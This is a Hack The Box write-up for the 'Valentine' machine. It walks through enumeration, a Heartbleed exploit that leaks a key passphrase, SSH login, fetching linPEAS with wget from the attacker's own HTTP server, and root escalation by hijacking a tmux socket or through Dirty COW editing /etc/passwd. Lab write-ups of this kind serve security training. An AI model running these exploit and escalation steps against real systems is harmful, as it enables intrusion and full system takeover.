---
title: "Valentine — Hack The Box [Write-up]"
author: 0x3ashry
description: "Writeup for Valentine Hackthebox Machine"
date: 2021-02-05 16:00:00 +0200
categories: [HackTheBox]
tags: [HTB, Linux]
pin: true
---


## Introduction

![](/img/HTB/Valentine/Valentine.png)

Valentine is a very unique machine which focuses on the Heartbleed vulnerability, which had devastating impact on systems across the globe.

Skills Required:
- Beginner/Intermediate knowledge of Linux

Skills Learned:
- Identifying servers vulnerable to Heartbleed
- Exploiting Heartbleed
- Exploiting permissive tmux sessions

Used Tools:
- Nmap
- Gobuster or Dirsearch
- Searchsploit
- Openssl


## 1. SCANNING & ENUMERATION

I will start with nmap and the -A parameter to enable OS detection, version detection, script scanning, and traceroute and append the output to tee command which save the in a file named “nmap” and also show the output on the screen.

![](/img/HTB/Valentine/img (1).png)

We found 3 open ports: **22 → for SSH, 80 → for HTTP, 443 → for HTTPS**

We opened the website but nothing appears except a single photo in a full screen mode and it doesn’t hide anything in its source code...

So let’s enumerate the directories of the web application using gobuster...

![](/img/HTB/Valentine/img (2).png)

We found a directory called **dev, encode, decode** pages.

So let’s check the dev directory first...

![](/img/HTB/Valentine/img (3).png)

We found 2 interesting files **hype_key** and **notes.txt**, Let’s check notes.txt first…

![](/img/HTB/Valentine/img (4).png)

The author says it would be nice to fix the encoder/decoder, keep that in mind (and yes, you’d better find another way to take notes, bro 😈).

Let’s check hype_key...

![](/img/HTB/Valentine/img (5).png)

It contain a bunch of hex-decimals so let’s decode them using **Hex to ASCII Text Converter**:

After decoding them i found that this is **private RSA key encrypted with a pass phrase**, We can use it to connect to the server using SSH service...

![](/img/HTB/Valentine/img (6).png)

So we have to find the pass phrase to decrypt it.

Let’s check the encoder and decoder pages...

**/encode:**

![](/img/HTB/Valentine/img (7).png)

Entered “hackthebox”:

![](/img/HTB/Valentine/img (8).png)

**/decode:**

![](/img/HTB/Valentine/img (9).png)

entered "aGFja3RoZWJveA=="

![](/img/HTB/Valentine/img (10).png)

The purpose of these pages isn’t clear yet, although i spent alot of time in it and found reflected XSS but it couldn’t be useful in our case So we had to find something else...

I couldn’t find any public exploits for any of the OpenSSH and Apache versions so what about the SSL version of port 443 let’s check if it is vulnerable...

I will use nmap scripts to do a full vulnerability scan on the SSL service:

```bash
nmap — script ssl* -p 443 10.10.10.79
```

we got a very long list of output but scrolling down i found something very interesting...

![](/img/HTB/Valentine/img (11).png)

This OpenSSL version is vulnerable to heartbleed which is is a serious vulnerability in the popular OpenSSL cryptographic software library. It allows for stealing information intended to be protected by SSL/TLS encryption.

For more understanding of the vunerability i will refer to this sketch from xkcd comic :

![Heartbleed Vulnerability](/img/HTB/Valentine/img (12).png)


## 2. EXPLOITATION

searchsploit heartbleed shows 4 exploits:

![](/img/HTB/Valentine/img (13).png)

I tried the last one…

```bash
searchsploit -m 32745
python 32745.py 10.10.10.79
```

![Server Information Disclosure using Heartbleed](/img/HTB/Valentine/img (14).png)

From the internal memory of the server, they pulled out a `lineaGVhcnRibGVlZGJlbGlldmV0aGVoeXBlCg==` that someone presumably entered into the decoder. Let's translate into meaningful text:

We can use base64 to ascii online decoders or the Valentine decoder page or base64 command in linux as:

```bash
base64 -d <<<”aGVhcnRibGVlZGJlbGlldmV0aGVoeXBlCg==”
```

![](/img/HTB/Valentine/img (15).png)

the decoding gives us a hint that it belong to the hype_key which we decode it and found that its an RSA encoded private key, So let’s try to decode it using this pass phrase…

```bash
openssl rsa -in rsa.key -out rsa_decrypted.key
```

rsa.key → our private key

rsa_decrypted.key → the output of the openssl

![](/img/HTB/Valentine/img (16).png)

he asked about the pass phrase and i write it, So let’s check the rsa_decrypted.key file…

![](/img/HTB/Valentine/img (17).png)

It is finally decrypted.


### SSH Connection:

Now we can connect to Valentine via SSH with a clear conscience (the username, by the way, had to be guessed, fortunately it was not difficult):

```bash
ssh -i rsa_decrypted.key hype@10.10.10.79
```

![](/img/HTB/Valentine/img (18).png)

We connected successfully and BOOOOOOOOOOM !!! Now we had a user flag :D


## 3. PRIVILEGE ESCALATION:

![Kernel Version](/img/HTB/Valentine/img (19).png)

The kernel version hints at the possibility of using **Dirty COW** , but we will leave the dirty hacks as a last resort. Let’s run *linPEAS* which is a script that search for possible paths to escalate privileges on Linux/Unix* hosts:

But first we had to transfer it from our machine to the valentine...

- In Kali:

open python server in the file that contain the linPEAS script

```bash
python -m SimpleHTTPServer 8080
```

- In Valentine:

```bash
wget http://10.10.16.130:8080/linpeas.sh
```

![](/img/HTB/Valentine/img (20).png)

Let’s give it the proper permissions and then execute the script...

![Started linPEAS.sh](/img/HTB/Valentine/img (21).png)

As expected a massive amount of information showed up, But one of the best things i like about linPEAS: its coloring system as firstly he said that the red color refers that You must take a look at it as a potential vulnerability and for more the red with yellow background refers that it is **95% a vector**.

First at the “Basic Information” part he colored the kernel version with red/yellow, YES i knew it, it is old version and has **Dirty COW**

![](/img/HTB/Valentine/img (22).png)

but let’s continue…

STOP !!!!! we found a tmux opened session:

![Tmux Opened Session](/img/HTB/Valentine/img (23).png)

**tmux:** this is a utility that allows you to manage terminal sessions, including "freezing" their current state with the possibility of subsequent resumption. What we will do is restore the paused session from the socket /.devs/dev_sess.

We’ll connect with the same command:

```bash
tmux -S /.devs/dev_sess
```

Once we typed this command it opened the suspended tmux session with root privileges…

![](/img/HTB/Valentine/img (24).png)

BOOOOOOOOOOOOOOOOOOOOM!!!!! Now we are root :D


## 3. PRIVILEGE ESCALATION — Method 2

What about our Dirty COW 😈

**Dirty COW Vulnerability simply allows user to write on files meant to be read only.**

From the *Large number of PoC* I found *this* (based on changing the root entry in /etc/passwd) as the most stable and completely reversible.

Dirty.c allow us to generates a new password hash on the fly and modifies /etc/passwd automatically

First we’ll transfer the dirty.c to the Valentine machine the same way we transfer linPEAS and then compile it…

![](/img/HTB/Valentine/img (25).png)

**1st → We transfered dirty.c**

**2nd → We compiled dirty.c to run on linux using gcc**

**3rd → Run ./dirty and it simply do the following:**

1- Backup the passwd file to restore it once we finish our attack

2- Create a new user called **firefart** and ask you to enter his password

3- Update the passwd file with our new user

4- Remind you to restore the original state of the passwd file after escalating your privilege

Now let’s change the user to “firefart”, thereby granting ourselves superuser rights:

![](/img/HTB/Valentine/img (26).png)

BOOOOOOOOOOOOOOOOOOOOM!!!!! Now we are root :D

Thank you so much for reading and I hope you learned a lot as I did ❤

#### ***0x3ashry***